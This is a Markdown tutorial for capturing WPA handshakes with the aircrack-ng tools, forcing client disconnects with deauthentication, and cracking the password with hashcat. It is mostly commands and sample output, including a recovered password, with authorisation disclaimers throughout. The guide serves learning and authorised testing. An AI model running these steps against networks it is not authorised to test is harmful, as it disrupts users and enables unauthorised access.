# WiFi WPA Password Cracking Guide

> **⚠️ DISCLAIMER**: This guide is for educational purposes only. Only use these techniques on networks you own or have explicit permission to test. Unauthorized access to computer networks is illegal.

## Prerequisites

> [!IMPORTANT]
> Before starting, ensure you have proper authorization to test the target network. Unauthorized access is illegal and punishable by law.

- WiFi adapter capable of monitor mode
- Linux system with aircrack-ng suite installed
- Hashcat installed
- Basic understanding of wireless security

> [!TIP]
> Popular WiFi adapters for penetration testing include: Alfa AWUS036ACS, Panda PAU09, and TP-Link AC600 T2U Plus.

## Required Tools

- `airmon-ng` - Monitor mode enabler
- `airodump-ng` - Packet capture tool
- `aireplay-ng` - Deauthentication tool
- `cap2hccapx` - File converter
- `hashcat` - Password cracking tool

---

## Phase 1: Capturing WPA Handshake

### Step 1: Install Required Software

Install aircrack-ng suite:

- Download from: https://www.aircrack-ng.org/downloads.html
- Follow installation instructions for your operating system

> [!NOTE]
> On Ubuntu/Debian: `sudo apt-get install aircrack-ng`
> On Arch Linux: `sudo pacman -S aircrack-ng`
> On macOS: `brew install aircrack-ng`

### Step 2: Enable Monitor Mode

1. **Identify your wireless interface:**

   ```bash
   iwconfig
   ```

   Make sure you have a wireless interface listed (e.g., `wlan1`) and supports monitor mode.

> [!WARNING]
> Not all WiFi adapters support monitor mode. Built-in laptop WiFi cards often don't support this feature.

2. **Enable monitor mode:**
   ```bash
   sudo airmon-ng start wlan1
   ```
   > Replace `wlan1` with your actual wireless interface name

> [!TIP]
> After enabling monitor mode, your interface name might change (e.g., `wlan1` becomes `wlan1mon`). Use `iwconfig` to check the new name.

3. **If you encounter process conflicts:**
   ```bash
   sudo airmon-ng check kill
   ```
   > This stops processes that might interfere with monitor mode

> [!CAUTION]
> The `airmon-ng check kill` command will terminate NetworkManager and other network processes, which may disconnect your internet connection temporarily.

### Step 3: Discover Available Networks

**Scan for wireless networks:**

```bash
sudo airodump-ng wlan1
```

> Replace `wlan1` with your monitor interface

> [!TIP]
> Look for networks with strong signal strength (PWR closer to 0) and active clients for better success rates.

**Example output:**

```
CH  4 ][ Elapsed: 3 mins ][ 2024-08-16 04:16

BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
20:87:EC:A9:AB:79  -70       37        0    0  11  130   WPA2 CCMP   PSK  5g_kostb20b
20:87:EC:A9:AB:78  -69       75        1    0  11  130   WPA2 CCMP   PSK  kostb20b
4C:C6:4C:8E:94:8E  -51      162        0    0   3  270   WPA2 CCMP   PSK  Indihohe
68:59:11:03:82:A8  -44      227       61    0   1  130   WPA2 CCMP   PSK  ISTIQOMAH (Target Network)

BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes
20:87:EC:A9:AB:79  8A:A6:BE:2D:CE:DC  -80    0 - 1      0        1
68:59:11:03:82:A8  BA:57:BA:0D:BB:8E  -84    1e- 1e     0     2690  EAPOL
```

> [!NOTE] > **Key Column Meanings:**
>
> - **PWR**: Signal strength (closer to 0 = stronger)
> - **Beacons**: Management frames from the router
> - **#Data**: Data packets captured
> - **CH**: Channel number
> - **ENC**: Encryption type (WPA/WPA2/WPA3)
> - **EAPOL**: Indicates potential handshake data

### Step 4: Target Specific Network (Terminal 1)

1. **Identify target network details:**
   - Note the BSSID (MAC address of router)
   - Note the channel number
   - Ensure it's WPA/WPA2 encrypted

> [!IMPORTANT]
> Only target networks with active clients (visible in STATION column) as handshakes require client authentication.

2. **Monitor specific target:**

   ```bash
   sudo airodump-ng -c [Channel] --bssid [BSSID] -w [filename] wlan1
   ```

   **Example:**

   ```bash
   sudo airodump-ng -c 1 --bssid 68:59:11:03:82:A8 -w /tmp/capture wlan1
   ```

> [!TIP]
> Use a descriptive filename like `capture_networkname_date` to organize your captures better.

**Example monitoring output:**

```
CH  1 ][ Elapsed: 4 mins ][ 2024-08-16 04:22

BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
68:59:11:03:82:A8  -43   2     2856      303    4   1  130   WPA2 CCMP   PSK ISTIQOMAH

BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes
68:59:11:03:82:A8  2E:E2:3A:48:33:AD  -76    1e- 6e     0        8
68:59:11:03:82:A8  BA:57:BA:0D:BB:8E  -84    1e- 1e     0     2690  EAPOL
```

> [!IMPORTANT]
> Continue to step 5 in a new terminal to capture the handshake. Don't close this terminal.

### Step 5: Force Handshake Capture (Terminal 2)

> [!WARNING]
> Deauthentication attacks will temporarily disconnect users from the network. Use responsibly and only on networks you own.

**Method 1: General deauthentication**

```bash
sudo aireplay-ng -0 200 -a [BSSID] wlan1
```

**Method 2: Targeted deauthentication**

```bash
sudo aireplay-ng -0 200 -a [BSSID] -c [Client_MAC] wlan1
```
- `-0 200`: Sends 200 deauth packets
- `-a [BSSID]`: Target router's MAC address
- `-c [Client_MAC]`: Target client's MAC address

> [!TIP]
> Method 2 is more effective as it targets specific clients, reducing network disruption and increasing success rate.

**Example:**

```bash
sudo aireplay-ng --deauth 10 -a 68:59:11:03:82:A8 wlan1
```

**Example deauth output:**

```
04:29:03  Waiting for beacon frame (BSSID: 68:59:11:03:82:A8) on channel 1
04:29:04  Sending 64 directed DeAuth (code 7). STMAC: [2E:5E:94:34:85:81] [49|41 ACKs]
04:29:05  Sending 64 directed DeAuth (code 7). STMAC: [2E:5E:94:34:85:81] [33|47 ACKs]
04:29:06  Sending 64 directed DeAuth (code 7). STMAC: [2E:5E:94:34:85:81] [0|46 ACKs]
04:29:07  Sending 64 directed DeAuth (code 7). STMAC: [2E:5E:94:34:85:81] [0|47 ACKs]
04:29:08  Sending 64 directed DeAuth (code 7). STMAC: [2E:5E:94:34:85:81] [59|61 ACKs]
```

### Step 6: Verify Handshake Capture

1. **Watch for handshake notification:**
   Look for this message in your airodump-ng terminal:
   ```
   CH  1 ][ Elapsed: 4 mins ][ 2024-08-16 04:22 ][ WPA handshake: 68:59:11:03:82:A8
   ```

> [!NOTE]
> The handshake capture notification appears in the top-right corner of the airodump-ng output.

2. **Stop monitoring:**
   Press `Ctrl+C` to stop airodump-ng once handshake is captured (Terminal 1).

3. **Verify capture file:**
   The handshake will be saved as `[filename].cap` (e.g., `capture-01.cap`)

> [!TIP]
> You can verify the handshake quality using: `aircrack-ng -c capture-01.cap`

### Step 6.1 Restart Network Manager (Optional)

If you used `airmon-ng check kill`, restart your network services:

```bash
sudo systemctl start NetworkManager
```

```
sudo systemctl restart NetworkManager
```

### Step 7: Convert Capture File

Convert the `.cap` file to Hashcat format:

```bash
cap2hccapx my-capture.cap my-capture.hc22000
```

> [!NOTE]
> Visit online converter: https://hashcat.net/cap2hccapx/

> [!TIP]
> Alternative conversion methods:
>
> - Use `hcxpcapngtool` (part of hcxtools): `hcxpcapngtool -o capture.hc22000 capture.cap`
> - Online converter: https://hashcat.net/cap2hccapx/ (upload your .cap file)

---

## Phase 2: Password Cracking with Hashcat

### Requirements

1. **Hashcat installation:**
   - Download from: https://hashcat.net/hashcat/

> [!NOTE]
> Hashcat works best with dedicated GPU (NVIDIA/AMD) for faster cracking speeds.

2. **Wordlist:**
   - Popular choice: `rockyou.txt`
   - Or create custom wordlists

> [!TIP] > **Popular wordlists:**
>
> - **rockyou.txt**: 14+ million passwords from real breaches
> - **SecLists**: https://github.com/danielmiessler/SecLists
> - **CrackStation**: https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm

### Basic Cracking Command

```bash
hashcat.exe -m 22000 [hashfile.hc22000] [wordlist.txt]
```

> [!IMPORTANT]
> Mode 22000 is specifically for WPA-PBKDF2-PMKID+EAPOL. Using the wrong mode will result in failure.

**Examples:**

```bash
hashcat.exe -m 22000 my-capture.hc22000 rockyou.txt
```

```cmd
.\hashcat.exe -m 22000 C:\hashcat\capture.hc22000 C:\hashcat\rockyou.txt
```

> [!TIP]
> Add `-w 3` for high workload (uses more GPU power): `hashcat.exe -m 22000 -w 3 capture.hc22000 rockyou.txt`

### Example Successful Output

When password is found, you'll see something like:

```
ed571d26869f09fa6cfdafc23936b31d:6859110382a8:ba57ba0dbb8e:ISTIQOMAH:istiqomahsaja888
```

> [!NOTE] > **Output format explanation:** > `[PMK]:[BSSID]:[STATION]:[ESSID]:[PASSWORD]`

**Full successful output example:**

```
.\hashcat.exe -m 22000 .\my-capture.hc22000 .\my-wordlists.txt
hashcat (v6.2.6) starting

Device #1: NVIDIA GeForce RTX 4060, 7099/8187 MB, 24MCU

Minimum password length supported by kernel: 8
Maximum password length supported by kernel: 63

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates

Dictionary cache built:
- Filename..: .\my-wordlists.txt
- Passwords.: 2143
- Bytes.....: 33252
- Keyspace..: 2143

ed571d26869f09fa6cfdafc23936b31d:6859110382a8:ba57ba0dbb8e:ISTIQOMAH:istiqomahsaja888

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
Hash.Target......: .\my-capture.hc22000
Time.Started.....: Sun Jul 13 14:02:16 2025 (1 sec)
Time.Estimated...: Sun Jul 13 14:02:17 2025 (0 secs)
Speed.#1.........: 64401 H/s (0.41ms)
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2143/2143 (100.00%)
Hardware.Mon.#1..: Temp: 56c Fan: 0% Util: 78% Core:2760MHz Mem:8250MHz

Started: Sun Jul 13 14:02:01 2025
Stopped: Sun Jul 13 14:02:18 2025
```

**Result Analysis:**

- **Network:** ISTIQOMAH
- **Password:** istiqomahsaja888
- **Cracking time:** 17 seconds
- **Wordlist size:** 2,143 passwords

> [!TIP] > **Performance indicators:**
>
> - **Speed**: 64,401 H/s (hashes per second)
> - **GPU utilization**: 78%
> - **Temperature**: 56°C (safe operating range)

---

## Performance Tips

### Optimizing Hashcat

1. **Use GPU acceleration:**
   ```bash
   hashcat.exe -m 22000 -d 1 capture.hc22000 wordlist.txt
   ```

> [!TIP]
> Use `-d 1,2,3` to utilize multiple GPUs simultaneously for faster cracking.

2. **Increase workload:**
   ```bash
   hashcat.exe -m 22000 -w 3 capture.hc22000 wordlist.txt
   ```

> [!CAUTION]
> Higher workload (`-w 3` or `-w 4`) may make your system unresponsive. Start with `-w 2` and increase gradually.

3. **Resume interrupted sessions:**
   ```bash
   hashcat.exe -m 22000 --restore
   ```

> [!NOTE]
> Hashcat automatically saves progress every few minutes. Use `--restore` to continue from where you left off.

### Wordlist Strategies

1. **Combine wordlists:**
   ```bash
   cat wordlist1.txt wordlist2.txt > combined.txt
   ```

> [!TIP]
> Remove duplicates with: `sort combined.txt | uniq > combined_unique.txt`

2. **Use rules for mutations:**
   ```bash
   hashcat.exe -m 22000 -r rules/best64.rule capture.hc22000 wordlist.txt
   ```

> [!NOTE]
> Rules apply transformations like capitalization, number appending, and character substitution to expand wordlist coverage.

3. **Create custom wordlists:**
   - Use tools like `crunch` or `cupp`
   - Target specific patterns (dates, names, locations)

> [!TIP] > **Custom wordlist tools:**
>
> - **crunch**: Generate character-based wordlists
> - **cupp**: Create wordlists based on personal information
> - **mentalist**: GUI-based wordlist generator

---

## Troubleshooting

### Common Issues

1. **Monitor mode not working:**
   - Check if adapter supports monitor mode
   - Kill interfering processes: `sudo airmon-ng check kill`

> [!WARNING]
> Some USB WiFi adapters require specific drivers. Check compatibility before purchasing.

2. **No handshake captured:**
   - Ensure clients are connected to target network
   - Try different deauth methods
   - Be patient - may take several attempts

> [!TIP] > **Troubleshooting handshake capture:**
>
> - Move closer to the target network
> - Try during peak usage hours (more clients = better chance)
> - Use `airodump-ng` with `--ignore-negative-one` flag

3. **Hashcat errors:**
   - Update GPU drivers
   - Check file format compatibility
   - Verify sufficient system resources

> [!CAUTION] > **Common Hashcat errors:**
>
> - `clCreateCommandQueue(): CL_OUT_OF_RESOURCES`: Reduce workload or free GPU memory
> - `No devices found/left`: Update drivers or check GPU compatibility
> - `Token length exception`: Verify hash file format

### Legal Considerations

> [!WARNING] > **Legal Requirements:**
>
> - Only test on networks you own
> - Obtain written permission for penetration testing
> - Follow local laws and regulations
> - Use responsibly for security research only

> [!CAUTION] > **Potential Legal Consequences:**
>
> - Unauthorized network access is a federal crime in most countries
> - Penalties can include fines and imprisonment
> - Corporate networks may have additional legal protections
> - Always ensure you have explicit authorization before testing

---

## Summary

This guide covers the complete process of:

1. Capturing WPA handshakes using aircrack-ng tools
2. Converting captures to Hashcat format
3. Cracking passwords using dictionary attacks
4. Optimizing performance and troubleshooting

> [!IMPORTANT] > **Key Success Factors:**
>
> - Strong WiFi adapter with monitor mode support
> - Target networks with active clients
> - Comprehensive wordlists and rules
> - Proper system optimization for Hashcat

> [!WARNING] > **Final Reminder:** This guide is for educational and authorized testing purposes only. Always ensure you have proper authorization before testing any network.

> [!TIP] > **Next Steps for Learning:**
>
> - Practice in controlled environments (home lab)
> - Study wireless security protocols
> - Learn about defensive measures
> - Explore advanced attack techniques (PMKID, WPS, etc.)
